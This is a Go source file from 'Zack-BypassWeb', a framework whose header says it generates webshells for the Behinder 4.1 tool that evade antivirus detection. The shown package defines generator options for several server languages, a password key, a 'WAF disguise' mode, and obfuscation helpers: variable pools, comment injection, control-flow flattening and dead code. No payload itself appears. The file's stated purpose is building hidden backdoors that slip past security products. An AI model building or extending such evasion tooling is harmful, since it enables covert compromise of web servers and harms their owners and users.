// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package generator

import (
	"fmt"
	"Zack-BypassWeb/pkg/evasion"
	"Zack-BypassWeb/pkg/utils"
	"Zack-BypassWeb/pkg/waf"
	"strings"
)

// Render replaces @0@, @1@, @2@, ... placeholders with the provided arguments.
// Unlike fmt.Sprintf, this does NOT interpret percent signs in the template.
func Render(tmpl string, args ...string) string {
	for i, arg := range args {
		tmpl = strings.ReplaceAll(tmpl, fmt.Sprintf("@%d@", i), arg)
	}
	return tmpl
}

// Options configures webshell generation (Behinder v4.1 only).
type Options struct {
	Language   string // jsp, jspx, php, asp, aspx, ashx
	Pass       string // password/key
	WAF        string // WAF disguise type
	EvasionLvl int    // 1=basic, 2=intermediate, 3=advanced
}

// Result holds the generated webshell.
type Result struct {
	Code string
	Note string
	Key  string // the 16-char MD5 key used
}

// Base holds common utilities for all generators.
type Base struct {
	Opts    Options
	VarPool *evasion.VarPool
	Comment *evasion.CommentInjection
	Flow    *evasion.ControlFlowFlattener
	Dead    *evasion.DeadCode
}

// NewBase creates a new Base with configured evasion tools.
func NewBase(opts Options, varCount int) *Base {
	return &Base{
		Opts:    opts,
		VarPool: evasion.NewVarPool(varCount),
		Comment: evasion.NewCommentInjection(mapLanguageToStyle(opts.Language)),
		Flow:    evasion.NewControlFlowFlattener(mapLanguageToStyle(opts.Language)),
		Dead:    evasion.NewDeadCode(mapLanguageToStyle(opts.Language)),
	}
}

func mapLanguageToStyle(lang string) string {
	switch lang {
	case "jsp", "jspx":
		return "java"
	case "php":
		return "php"
	case "asp":
		return "asp"
	case "aspx", "ashx":
		return "csharp"
	default:
		return "java"
	}
}

// GetWAFCode generates WAF disguise code for the current options.
func (b *Base) GetWAFCode() string {
	if b.Opts.WAF == "" || b.Opts.WAF == "none" {
		return ""
	}
	wd := waf.NewWAFDisguise(b.Opts.Language)
	return wd.Generate(b.Opts.WAF)
}

// GetKey returns the password if set, otherwise generates a random one.
func (b *Base) GetKey() string {
	if b.Opts.Pass == "" || b.Opts.Pass == "random" {
		return utils.RandString(utils.RandInt(6, 12))
	}
	return b.Opts.Pass
}

